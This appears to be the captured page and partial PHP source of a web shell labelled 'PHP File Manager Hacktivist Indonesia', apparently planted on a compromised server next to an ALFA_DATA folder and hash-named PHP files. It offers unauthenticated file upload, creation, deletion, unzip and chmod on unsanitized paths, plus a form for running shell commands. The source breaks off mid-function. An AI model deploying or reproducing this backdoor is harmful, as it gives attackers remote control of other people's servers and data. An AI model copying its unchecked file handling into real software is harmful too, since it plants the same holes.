
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP File Manager Whiterose</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            margin: 0;
            padding: 20px;
        }
        h2 {
            text-align: center;
            color: #444;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        form {
            margin-bottom: 20px;
        }
        input[type="text"], input[type="file"], input[type="number"] {
            width: 100%;
            padding: 8px;
            margin: 10px 0;
            box-sizing: border-box;
            border: 1px solid #ccc;
        }
        input[type="submit"], .btn {
            background: #007BFF;
            color: #fff;
            padding: 10px;
            border: none;
            cursor: pointer;
            width: 100%;
        }
        input[type="submit"]:hover, .btn:hover {
            background: #0056b3;
        }
        .success {
            color: green;
            margin-bottom: 10px;
        }
        .error {
            color: red;
            margin-bottom: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid #ddd;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        .actions {
            text-align: center;
        }
        .actions a, .actions form {
            display: inline-block;
            margin: 0 5px;
        }
        .actions a.btn, .actions input[type="submit"] {
            width: auto;
            padding: 5px 10px;
        }
        .pagination {
            margin-top: 20px;
            text-align: center;
        }
        .pagination a {
            padding: 5px 10px;
            margin: 0 5px;
            background: #007BFF;
            color: #fff;
            text-decoration: none;
        }
        .pagination a:hover {
            background: #0056b3;
        }
        .breadcrumb {
            margin: 20px 0;
            padding: 10px;
            background-color: #eee;
            border-radius: 4px;
        }
        .breadcrumb a {
            color: #007BFF;
            text-decoration: none;
            margin-right: 5px;
        }
        .breadcrumb a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>PHP File Manager Hacktivist Indonesia</h2>

    <form enctype="multipart/form-data" method="post">
        Pilih file: <input name="file_to_upload" type="file"><br><br>
        <input type="submit" value="Upload File">
    </form>

    <hr>

    <form method="post">
        Nama file baru: <input type="text" name="new_file" placeholder="contoh.txt"><br><br>
        <input type="submit" value="Buat File">
    </form>

    <hr>

    <form method="post">
        Nama folder baru: <input type="text" name="new_folder" placeholder="nama_folder"><br><br>
        <input type="submit" value="Buat Folder">
    </form>

    <hr>

    <h3>Daftar File dan Folder</h3>
    <div class="breadcrumb">
        <a href="?dir=%2F.">.</a> /     </div>
    <table>
        <tr>
            <th>Nama</th>
            <th>Ukuran</th>
            <th>Izin</th>
            <th>Tindakan</th>
        </tr>
                                                        <tr>
                <td>
                                            <a href="?dir=.%2FALFA_DATA">ALFA_DATA/</a>
                                    </td>
                <td>-</td>
                <td>0777</td>
                <td class="actions">
                                        <a href="?dir=.&delete=.%2FALFA_DATA" class="btn" onclick="return confirm('Apakah Anda yakin ingin menghapus ini?')">Hapus</a>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="chmod_file" value="./ALFA_DATA">
                        <input type="number" name="chmod_value" placeholder="0777" style="width: 60px;">
                        <input type="submit" value="Chmod" class="btn">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            bd7e5dba20e1ee2758a756b9b9abc76a.php                                    </td>
                <td>10.16 KB</td>
                <td>0777</td>
                <td class="actions">
                                            <a href="?dir=.&download=.%2Fbd7e5dba20e1ee2758a756b9b9abc76a.php" class="btn">Download</a>
                                                                <a href="?dir=.&delete=.%2Fbd7e5dba20e1ee2758a756b9b9abc76a.php" class="btn" onclick="return confirm('Apakah Anda yakin ingin menghapus ini?')">Hapus</a>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="chmod_file" value="./bd7e5dba20e1ee2758a756b9b9abc76a.php">
                        <input type="number" name="chmod_value" placeholder="0777" style="width: 60px;">
                        <input type="submit" value="Chmod" class="btn">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            ee9076bf422adf0ca9aba9b0ddd2b0c2.php                                    </td>
                <td>0 B</td>
                <td>0777</td>
                <td class="actions">
                                            <a href="?dir=.&download=.%2Fee9076bf422adf0ca9aba9b0ddd2b0c2.php" class="btn">Download</a>
                                                                <a href="?dir=.&delete=.%2Fee9076bf422adf0ca9aba9b0ddd2b0c2.php" class="btn" onclick="return confirm('Apakah Anda yakin ingin menghapus ini?')">Hapus</a>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="chmod_file" value="./ee9076bf422adf0ca9aba9b0ddd2b0c2.php">
                        <input type="number" name="chmod_value" placeholder="0777" style="width: 60px;">
                        <input type="submit" value="Chmod" class="btn">
                    </form>
                </td>
            </tr>
                                <tr>
                <td>
                                            kata.php                                    </td>
                <td>0 B</td>
                <td>0644</td>
                <td class="actions">
                                            <a href="?dir=.&download=.%2Fkata.php" class="btn">Download</a>
                                                                <a href="?dir=.&delete=.%2Fkata.php" class="btn" onclick="return confirm('Apakah Anda yakin ingin menghapus ini?')">Hapus</a>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="chmod_file" value="./kata.php">
                        <input type="number" name="chmod_value" placeholder="0777" style="width: 60px;">
                        <input type="submit" value="Chmod" class="btn">
                    </form>
                </td>
            </tr>
            </table>

    
    <hr>

    <h3>Jalankan Perintah CMD</h3>
    <form method="post">
        <input type="text" name="cmd" placeholder="ls -la" required>
        <input type="submit" value="Jalankan Perintah" class="btn">
    </form>

    <?php

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$files_per_page = 20;
$current_page = isset($_GET['page']) ? intval($_GET['page']) : 1;

if (isset($_FILES['file_to_upload']) && !empty($_FILES['file_to_upload']['name'])) {
    $upload_file = $current_dir . '/' . basename($_FILES['file_to_upload']['name']);
    if (move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $upload_file)) {
        echo "<div class='success'>File berhasil diunggah.</div>";
    } else {
        echo "<div class='error'>Gagal mengunggah file.</div>";
    }
}

if (isset($_POST['new_file']) && !empty($_POST['new_file'])) {
    $new_file_path = $current_dir . '/' . $_POST['new_file'];
    if (file_put_contents($new_file_path, '') !== false) {
        echo "<div class='success'>File berhasil dibuat.</div>";
    } else {
        echo "<div class='error'>Gagal membuat file.</div>";
    }
}

if (isset($_POST['new_folder']) && !empty($_POST['new_folder'])) {
    $new_folder_path = $current_dir . '/' . $_POST['new_folder'];
    if (mkdir($new_folder_path)) {
        echo "<div class='success'>Folder berhasil dibuat.</div>";
    } else {
        echo "<div class='error'>Gagal membuat folder.</div>";
    }
}

if (isset($_GET['delete']) && !empty($_GET['delete'])) {
    $file_to_delete = $_GET['delete'];
    if (is_dir($file_to_delete)) {
        rmdir($file_to_delete);
        echo "<div class='success'>Folder berhasil dihapus.</div>";
    } else {
        unlink($file_to_delete);
        echo "<div class='success'>File berhasil dihapus.</div>";
    }
}

if (isset($_GET['unzip']) && !empty($_GET['unzip'])) {
    $file_to_unzip = $_GET['unzip'];
    $zip = new ZipArchive;
    if ($zip->open($file_to_unzip) === TRUE) {
        $zip->extractTo($current_dir);
        $zip->close();
        echo "<div class='success'>File berhasil di-unzip.</div>";
    } else {
        echo "<div class='error'>Gagal meng-unzip file.</div>";
    }
}

if (isset($_POST['chmod']) && !empty($_POST['chmod_file']) && !empty($_POST['chmod_value'])) {
    $chmod_file = $_POST['chmod_file'];
    $chmod_value = $_POST['chmod_value'];
    if (chmod($chmod_file, octdec($chmod_value))) {
        echo "<div class='success'>Izin file berhasil diubah.</div>";
    } else {
        echo "<div class='error'>Gagal mengubah izin file.</div>";
    }
}

$all_files = scandir($current_dir);
$files = array_slice($all_files, ($current_page - 1) * $files_per_page, $files_per_page);

function formatSize($size) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 